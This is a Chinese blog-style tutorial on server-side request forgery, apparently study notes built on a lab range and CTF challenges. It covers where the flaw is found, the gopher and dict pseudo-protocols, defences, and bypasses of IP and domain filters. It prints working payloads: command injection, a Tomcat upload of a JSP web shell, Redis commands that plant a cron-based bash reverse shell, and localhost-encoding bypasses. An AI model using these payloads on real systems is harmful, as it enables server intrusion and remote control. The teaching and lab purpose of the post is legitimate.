---
title: SSRF服务端伪造&伪协议利玩法&域名及IP绕过&无回显利用&挖掘点
published: 2026-07-02T20:00:00
description: SSRF漏洞从原理挖掘到实战利用的完整攻击链，重点解析了伪协议（如gopher构造POST请求）的两次编码逻辑、有/无回显场景的区分与绕过手法，并辅以内网探测、命令执行及Redis等中间件服务的具体利用流程。
tags:
  - Web攻防
  - SSRF
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-SSRF利用绕过-伪协议&IP及域名
2. WEB攻防-SSRF挖掘思路-功能逻辑&SRC复盘

# SSRF漏洞原理

服务器端请求伪造，也称为SSRF（Server-Side Request Forgery），是因为前端用户可以输入任意URL到后端服务器，而且服务器也没有对其URL进行严格的过滤和校验，导致攻击者可以构造一些恶意的URL让服务器去访问执行。

*主要安全影响：

- 读取服务器本地文件

- 探测内网存活主机和开放端口

- 攻击其他内网服务器及服务

# SSRF漏洞挖掘

## 黑盒探针

### 业务功能点

1. 社交分享功能：获取超链接的标题等内容进行显示
2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3. 在线翻译：给网址翻译对应网页的内容
4. 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
5. 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
8. 数据库内置功能：数据库的比如mongodb的copyDatabase函数
9. 邮件系统：比如接收邮件服务器地址
10. 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
11. 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

### URL关键参数

```
share
wap
url
link
src
source
target
u
display
sourceURl
imageURL
domain
```

## 白盒分析

见代码审计（文件读取，加载，数据操作类的函数）

# SSRF伪协议利用

```
http:// Web常见访问，如http://127.0.0.1
file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议

gopher:// 分布式文档传递服务，可使用gopherus生成payload
```

由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）

应用：漏洞利用 或 信息收集 通讯相关服务的时候

工具：Gopherus

# SSRF绕过方式

限制为http://www.xxx.com 域名

```
采用http基本身份认证的方式绕过，即@
http://www.xxx.com@www.xxyy.com
```

限制请求IP不为内网地址

```
当不允许ip为内网地址时：
（1）采取短网址绕过
（2）采取域名解析
（3）采取进制转换
（4）采取3XX重定向
```

# SSRF漏洞防御

1. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。
2. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3. 限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4. 黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5. 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。

# SSRF-响应回显

## 有回显

输入URL，目标资源的响应内容（HTML/JSON/文件内容等）直接返回给客户端。根据目标情况，**利用伪协议**对目标资源进行读取。

## 半回显

页面不返回目标内容，但返回超时、拒绝连接等明确的报错信息。通过**报错差异进行端口/服务探测**。

## 无回显

无论访问成功与否，页面完全无变化（同样状态码、同样空白、或者无效信息）。**DNS外带**（`http://burp.collab`）、**HTTP外带**（如果有请求日志）或**时序延迟**（`?url=http://slow-server`）。

同时可以实现：**利用SSRF漏洞进行DNS、HTTP/S等反连来绕过CDN获取真实源站IP**

# SSRF核心利用-伪协议

## 靶场演示

### 环境准备

靶场地址：https://github.com/sqlsec/ssrf-vuls

自行起服务器然后安装docker搭建

### 信息探针

通过访问`127.0.0.1`判断回显类型，发现正常回显

利用读取文件的大小写判断操作系统，之后尝试读取文件内容，因为是Linux，所以读取`/etc/hosts`获取内网ip地址

使用burp对该区间的ip和端口进行存活探测

使用burp选取sniper模式，然后给ip地址末位设置为变量，探测其他存活的80端口，比如获取到的ip为`172.150.23.21`，给21设置为变量，然后从21开始到255结束，之后根据返回的数据包长度判断存活的ip

如果需要判断端口，就在burp选取集束炸弹模式，把末位和端口都设置为变量，看最后返回数据包长度

### 代码注入-GET-http://伪协议

利用fuzz的字典或者kali中的各种扫描路径工具

发现存在shell.php文件，代码中包含`system($_GET['cmd'])`

于是就可以进行命令执行

### 命令执行-POST-gopher://伪协议

回显发现是个ping命令的界面，于是尝试执行ping命令，但现在是使用本机对对方某个ip进行链接

```
POST / HTTP/1.1
Host: 172.150.23.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://172.150.23.24
Connection: close
Referer: http://172.150.23.24/
Cookie: timezone=8
Upgrade-Insecure-Requests: 1
 
ip=127.0.0.1%3Bcat+%2Fflag
```

因为需要使用post发包，但是网站只支持get请求，所以需要使用到`gopher://`伪协议

对以上数据包进行两次URL编码（针对原始**整个 HTTP 报文**和**服务器（Tomcat/Nginx/Flask）在接收到这个请求时，会自动对 Query String 进行一次解析**所以**需要两次编码**），之后在抓到的原本页面数据包中进行修改：`url=gopher://目标ip:端口/_编码后的内容`，同时因为使用`gopher://`伪协议，所以需要在请求头部分删除`Accept-Encoding`

### Tomcat漏洞

同上，也是使用gopher伪协议

```
PUT /1.jsp/ HTTP/1.1
Host: 172.150.23.26:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 460
 
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

### Redis

清空 key

```
dict://172.150.23.27:6379/flushall
```

设置要操作的路径为定时任务目录

```
dict://172.150.23.27:6379/config set dir /var/spool/cron/
```

在定时任务目录下创建 root 的定时任务文件

```
dict://172.150.23.27:6379/config set dbfilename root
```

写入 Bash 反弹 shell 的 payload

```
dict://172.150.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"
```

保存上述操作

```
dict://172.150.23.27:6379/save
```

### MYSQL

链接数据库，执行sql语句

转为gopher协议

项目地址：[https://github.com/tarunkant/Gopherus]()

```
python2 gopherus.py --exploit mysql
```

```
root
show variables like '%plugin%'
```

将生成的payload编码，后续再进行一次URL编码

# SSRF过滤绕过-CTFSHOW 白盒

## 无过滤直接获取

```
url=http://127.0.0.1/flag.php
```

## IP地址进制绕过

十六进制

```
url=http://0x7F.0.0.1/flag.php
```

八进制

```
url=http://0177.0.0.1/flag.php
```

10 进制整数格式

```
url=http://2130706433/flag.php
```

16 进制整数格式，还是上面那个网站转换记得前缀0x

```
url=http://0x7F000001/flag.php
```

还有一种特殊的省略模式

127.0.0.1写成127.1

用CIDR绕过localhost

	url=http://127.127.127.127/flag.php

还有很多方式

	url=http://0/flag.php

	url=http://0.0.0.0/flag.php

## 域名解析IP绕过

申请域名，然后解析为`test`，记录值为`127.0.0.1`

```
test.xiaodi8.com -> 127.0.0.1
```

```
url=http://test.xiaodi8.com/flag.php
```

## 长度限制IP绕过

```
url=http://127.1/flag.php
```

```
url=http://0/flag.php
```

## 利用重定向解析绕过

搭建一个网站，然后在代码中重定向到`127.0.0.1`

```
<?php
header("Location:http://127.0.0.1/flag.php");
url=http://47.94.236.117/xx.php
```

## 匹配且不影响写法解析

```
url=http://ctf.@127.0.0.1/flag.php?show
```

## 利用gopher协议打服务

参考上述工具项目

# 复盘

以上详细截图页面及后续内容可以参考这位大佬的文章：[https://superhero.blog.csdn.net/article/details/149000915]()